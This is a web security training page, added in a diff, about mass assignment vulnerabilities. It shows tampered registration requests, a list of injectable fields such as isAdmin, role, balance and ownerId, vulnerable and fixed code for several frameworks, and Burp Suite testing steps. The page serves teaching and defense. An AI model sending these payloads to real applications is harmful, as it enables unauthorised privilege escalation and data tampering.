@@ -1,0 +1,160 @@
+---
+layout: training-page
+title: "Mass Assignment — Red Team Academy"
+module: "Web Hacking"
+tags:
+  - mass-assignment
+  - api-security
+  - privilege-escalation
+  - parameter-tampering
+page_key: "web-mass-assignment"
+---
+<h1>Mass Assignment</h1>
+<p>Mass assignment is a vulnerability where a web application automatically maps user-supplied input to object properties without restricting which properties are allowed to be set. If an attacker can modify sensitive internal fields — such as admin flags, account balances, or role assignments — they can escalate privileges or manipulate data they should never have access to.</p>
+
+<h2>How It Works</h2>
+<p>Many web frameworks (Ruby on Rails, Django, Laravel, Node.js with Mongoose, Spring, etc.) support "mass assignment" as a convenience feature, allowing developers to populate an object's fields from a request body in a single call. When the allowlist of assignable fields is missing or improperly configured, attackers can inject additional fields into the request.</p>
+
+<p>Example: a user registration endpoint expects only <code>username</code>, <code>email</code>, and <code>password</code>:</p>
+<pre><code>POST /api/users/register
+Content-Type: application/json
+
+{
+    "username": "attacker",
+    "email": "attacker@email.com",
+    "password": "password123"
+}</code></pre>
+
+<p>An attacker adds an <code>isAdmin</code> field to the request body:</p>
+<pre><code>POST /api/users/register
+Content-Type: application/json
+
+{
+    "username": "attacker",
+    "email": "attacker@email.com",
+    "password": "password123",
+    "isAdmin": true
+}</code></pre>
+
+<p>If the application does not validate which fields may be set during registration, the ORM will map <code>isAdmin: true</code> directly to the user object, granting admin privileges upon account creation.</p>
+
+<h2>Finding Mass Assignment Vulnerabilities</h2>
+
+<h3>Step 1 — Enumerate the Object Model</h3>
+<p>Identify what fields exist on the underlying object that are not exposed in the normal API response. Sources of information:</p>
+<ul>
+  <li>API documentation or OpenAPI/Swagger specs</li>
+  <li>JavaScript source code referencing field names</li>
+  <li>Database schema files or migration scripts</li>
+  <li>Error messages that leak field names (e.g., validation errors listing all available fields)</li>
+  <li>Admin endpoints or internal API responses that include more fields than the public API</li>
+</ul>
+
+<h3>Step 2 — Identify Assignment Points</h3>
+<p>Look for endpoints that accept user input and map it to persistent objects:</p>
+<ul>
+  <li>Registration / account creation (<code>POST /api/users</code>)</li>
+  <li>Profile update (<code>PUT /api/users/me</code>, <code>PATCH /api/profile</code>)</li>
+  <li>Object creation (<code>POST /api/orders</code>, <code>POST /api/products</code>)</li>
+  <li>Settings update endpoints</li>
+</ul>
+
+<h3>Step 3 — Inject Sensitive Fields</h3>
+<p>Common fields worth trying:</p>
+<pre><code># Privilege escalation
+{"isAdmin": true}
+{"role": "admin"}
+{"admin": true}
+{"is_staff": true}
+{"permissions": ["admin", "superuser"]}
+{"userType": "administrator"}
+{"accountType": "premium"}
+{"subscription": "enterprise"}
+
+# Account manipulation
+{"balance": 999999}
+{"credits": 9999}
+{"verified": true}
+{"emailVerified": true}
+
+# Authentication bypass
+{"password": "newpassword"}      # on a profile update endpoint
+{"passwordResetToken": "abc123"}
+
+# ID / ownership manipulation
+{"userId": 1}       # target admin user's ID
+{"ownerId": 1}      # take ownership of objects</code></pre>
+
+<h2>Framework-Specific Examples</h2>
+
+<h3>Ruby on Rails</h3>
+<p>Vulnerable code uses <code>params</code> directly without a strong parameters permit list:</p>
+<pre><code># Vulnerable — permits all user-supplied attributes
+@user = User.new(params[:user])
+
+# Safe — explicit permit list
+@user = User.new(params.require(:user).permit(:username, :email, :password))</code></pre>
+
+<h3>Django (Python)</h3>
+<p>Vulnerable code in a DRF serializer with no <code>read_only_fields</code>:</p>
+<pre><code># Vulnerable — all fields writable
+class UserSerializer(serializers.ModelSerializer):
+    class Meta:
+        model = User
+        fields = '__all__'
+
+# Safe — restrict writable fields
+class UserSerializer(serializers.ModelSerializer):
+    class Meta:
+        model = User
+        fields = ['username', 'email', 'password']
+        read_only_fields = ['is_staff', 'is_superuser', 'is_admin']</code></pre>
+
+<h3>Laravel (PHP)</h3>
+<p>Vulnerable code uses <code>$request-&gt;all()</code> without fillable restriction:</p>
+<pre><code>// Vulnerable
+$user = User::create($request-&gt;all());
+
+// Safe — $fillable defined in the model
+protected $fillable = ['username', 'email', 'password'];
+protected $guarded = ['isAdmin', 'role'];</code></pre>
+
+<h3>Node.js / MongoDB (Mongoose)</h3>
+<pre><code>// Vulnerable — spreads all request body fields into the update
+User.findByIdAndUpdate(userId, req.body);
+
+// Safe — explicitly pick allowed fields
+const { username, email } = req.body;
+User.findByIdAndUpdate(userId, { username, email });</code></pre>
+
+<h2>API Mass Assignment (REST APIs)</h2>
+<p>REST APIs are especially susceptible because they often accept JSON request bodies that are directly deserialized into model objects. Always test:</p>
+<ul>
+  <li>Additional JSON fields beyond the documented ones</li>
+  <li>Nested objects (e.g., <code>{"user": {"role": "admin"}}</code>)</li>
+  <li>Arrays (e.g., <code>{"groups": ["admin", "superuser"]}</code>)</li>
+  <li>Fields from related objects (e.g., <code>{"profile": {"isVerified": true}}</code>)</li>
+</ul>
+
+<h2>Detection with Burp Suite</h2>
+<pre><code># Intercept a registration or profile update request
+# Add extra fields and observe if they are accepted without error
+
+# Example: normal request
+POST /api/register
+{"username":"test","email":"test@test.com","password":"pass123"}
+
+# Tampered request — add fields and check the response or subsequent profile GET
+POST /api/register
+{"username":"test","email":"test@test.com","password":"pass123","isAdmin":true,"role":"admin"}
+
+# Confirm: GET /api/users/me — check if isAdmin or role changed in the response</code></pre>
+
+<h2>Resources</h2>
+<ul>
+  <li>PayloadsAllTheThings — Mass Assignment — <code>github.com/swisskyrepo/PayloadsAllTheThings</code></li>
+  <li>OWASP Mass Assignment Cheat Sheet — <code>cheatsheetseries.owasp.org/cheatsheets/Mass_Assignment_Cheat_Sheet.html</code></li>
+  <li>Hunting for Mass Assignment — Shivam Bathla — <code>blog.pentesteracademy.com/hunting-for-mass-assignment-56ed73095eda</code></li>
+  <li>What is Mass Assignment? Attacks and Security Tips — Vaadata — <code>vaadata.com/blog/what-is-mass-assignment-attacks-and-security-tips</code></li>
+  <li>Root Me — API Mass Assignment — <code>root-me.org/en/Challenges/Web-Server/API-Mass-Assignment</code></li>
+</ul>
